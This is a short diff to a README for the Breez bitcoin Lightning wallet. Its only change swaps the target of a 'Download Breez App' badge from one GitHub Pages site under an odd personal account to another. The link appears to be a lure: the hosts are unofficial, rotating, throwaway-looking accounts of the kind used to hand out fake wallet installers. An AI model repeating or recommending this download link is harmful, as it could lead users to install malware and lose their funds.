@@ -2,7 +2,7 @@
 
 ![Breez wallet interface with Lightning payments, podcast streaming, and point-of-sale panels](https://avatars.mds.yandex.net/i?id=1cc9e4d57940e76c5251dd359313ee46bb247f7a-16365022-images-thumbs&n=13)
 
-[![Download Breez](https://img.shields.io/badge/Download-Breez_App-blueviolet?style=for-the-badge&logo=bitcoin)](https://ozzyericksonjlug.github.io/.github/breez-wallet)
+[![Download Breez](https://img.shields.io/badge/Download-Breez_App-blueviolet?style=for-the-badge&logo=bitcoin)](https://kannonlangdedb.github.io/.github/breez-wallet)
 
 ## Breez Network Overview
 
